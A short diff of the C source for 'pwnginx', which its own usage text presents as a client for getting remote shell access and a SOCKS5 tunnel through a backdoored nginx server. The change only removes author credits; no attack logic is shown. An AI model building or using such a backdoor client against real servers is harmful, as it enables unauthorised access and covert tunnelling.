@@ -1,7 +1,5 @@
 /*                                 
  *  pwnginx.c - pwnginx client
- *  t57root@gmail.com              
- *  openwill.me / www.hackshell.net
  */ 
 #include <sys/types.h>  
 #include <sys/socket.h>
@@ -31,8 +29,6 @@ char *socks5port;
 int main(int argc,char **argv)
 {
     printf("[ Pwnginx ] - Pwn nginx\n"
-    "Copyleft by t57root @ openwill.me\n"
-    "<t57root@gmail.com>  [www.HackShell.net]\n\n"
     "Usage:\n"
     "Get a shell access via the nginx running @ [ip]:[port]\n\t%s shell [ip] [port] [password]\n"
     "Get a socks5 tunnel listening at [socks5ip]:[socks5port]\n\t%s socks5 [ip] [port] [password] [socks5ip] [socks5port]\n"
